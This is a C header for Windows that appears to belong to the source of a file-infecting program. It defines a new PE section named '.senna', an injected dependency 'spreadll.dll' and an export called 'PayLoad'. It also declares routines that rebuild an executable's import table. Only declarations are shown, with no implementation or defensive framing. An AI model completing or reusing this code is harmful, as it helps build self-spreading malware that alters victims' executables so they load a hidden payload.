#ifndef __SPREAD_H
#define __SPREAD_H


//#define  _TEST  1


#include <windows.h>
#include <stdio.h>
#include "peclass.h"

#define  MakePtr( cast, ptr, addValue )  ( cast ) ( ( DWORD ) ( ptr ) + ( DWORD ) ( addValue ) )

#define  NEW_SECTION_NAME  ".senna"
#define  DEPENDENCY_NAME   "spreadll.dll"
#define  FUNCTION_NAME     "PayLoad"


bool GetImportTableBuffer( void* OutBuffer, int OutSize, IMAGE_SECTION_HEADER BaseSection );
bool BuildIATTable( HANDLE hModule );

int GetNewImportSize();

#endif
